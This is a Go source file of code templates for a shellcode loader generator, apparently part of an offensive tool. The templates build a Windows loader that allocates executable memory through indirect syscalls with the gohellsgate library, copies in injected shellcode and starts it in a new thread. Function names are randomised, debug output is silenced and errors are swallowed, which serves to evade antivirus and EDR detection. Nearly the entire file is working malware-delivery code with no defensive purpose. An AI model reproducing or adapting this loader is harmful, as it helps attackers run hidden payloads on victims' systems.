package encode

var FUCKFUCKmain = []string{
	`cuowu := {{.suiji}}({{.shellcode}}, true, true)
	if cuowu != nil {
		//fmt.Print(err)
	}`,
	``,
}

var FUCKFUCKvar = []string{
	`func {{.suiji}}(sc []byte, rwx bool, verbose bool) error {
	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	//var nullRef int
	var flProtect int

	size := len(sc)

	if rwx {
		if verbose {
			//fmt.Println("[+] Memory Permissions will be set to RWX")
		}
		flProtect = windows.PAGE_EXECUTE_READWRITE
	} else {
		if verbose {
			//fmt.Println("[+] Memory Permissions will be set to RW")
		}
		flProtect = windows.PAGE_READWRITE
	}

	if verbose {
		//fmt.Println("[+] Allocating memory for shellcode")
	}

	pHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return nil
	}

	if verbose {
		//fmt.Println("[+] Allocating memory for shellcode using NtAllocateVirtualMemory")
	}
	addr, err := NtAllocateVirtualMemorySyscall("NtAllocateVirtualMemory", uintptr(pHandle), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, flProtect, verbose)
	if err != nil {
		return nil
	}
	if verbose {
		//fmt.Printf("[+] Allocated Memory Address: %p\n", unsafe.Pointer(addr))
	}
	procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(size))
	if verbose {
		//fmt.Println("[+] Wrote shellcode bytes to destination address")
	}

	//time.Sleep(10 * time.Second)
	if !rwx {
		if verbose {
			//fmt.Println("[+] Changing Permissions to RX")
		}
		var oldProtect uint32

		err = NtProtectVirtualMemory("NtProtectVirtualMemory", uintptr(pHandle), addr, uintptr(size), uintptr(windows.PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)), true)
		if err != nil {
			return nil
		}
	}

	_, err = NtCreateThreadEx("NtCreateThreadEx", uintptr(pHandle), addr, verbose)
	if err != nil {
		return nil
	}

	return nil
}

func NtAllocateVirtualMemorySyscall(ntapi string, handle uintptr, length uintptr, alloctype int, protect int, verbose bool) (uintptr, error) {

	// syscall for NtAllocateVirtualMemory

	var BaseAddress uintptr

	_, err := gohellsgate.IndirectSyscall(
		ntapi,
		uintptr(unsafe.Pointer(handle)),       //1
		uintptr(unsafe.Pointer(&BaseAddress)), //2
		0,                                     //3
		uintptr(unsafe.Pointer(&length)),      //4
		uintptr(0x3000),                       //5
		0x40,                                  //6
	)
	if err != nil {
		return 0, nil
	}
	if verbose {
		//fmt.Printf("[+] Allocated address from NtAllocateVirtualMemory %p\n", unsafe.Pointer(BaseAddress))
	}

	return BaseAddress, nil
}

func NtProtectVirtualMemory(ntapi string, handle, addr uintptr, size uintptr, flNewProtect uintptr, lpflOldProtect uintptr, verbose bool) error {
	_, err := gohellsgate.IndirectSyscall(
		ntapi,
		handle,
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		flNewProtect,
		lpflOldProtect,
	)
	if err != nil {
		return nil
	}
	if verbose {
		//fmt.Println("[+] Changed memory permissions")
	}
	return nil
}

func NtCreateThreadEx(ntapi string, handle, BaseAddress uintptr, verbose bool) (uintptr, error) {


	var hThread uintptr
	DesiredAccess := uintptr(0x1FFFFF)
	_, err := gohellsgate.IndirectSyscall(
		ntapi,
		uintptr(unsafe.Pointer(&hThread)),    //1
		DesiredAccess,                        //2
		0,                                    //3
		uintptr(unsafe.Pointer(handle)),      //4
		uintptr(unsafe.Pointer(BaseAddress)), //5
		0,                                    //6
		uintptr(0),                           //7
		0,                                    //8
		0,                                    //9
		0,                                    //10
		0,
	)
	if err != nil {
		return 0, nil
	}

	if verbose {
		//fmt.Printf("[+] Thread Handle: 0x%v\n", hThread)
	}
	syscall.WaitForSingleObject(syscall.Handle(hThread), 0xffffffff)
	return hThread, nil
}`,
	`
	"unsafe"
	"golang.org/x/sys/windows"
    "github.com/scriptchildie/gohellsgate"
	"syscall"
`,
}
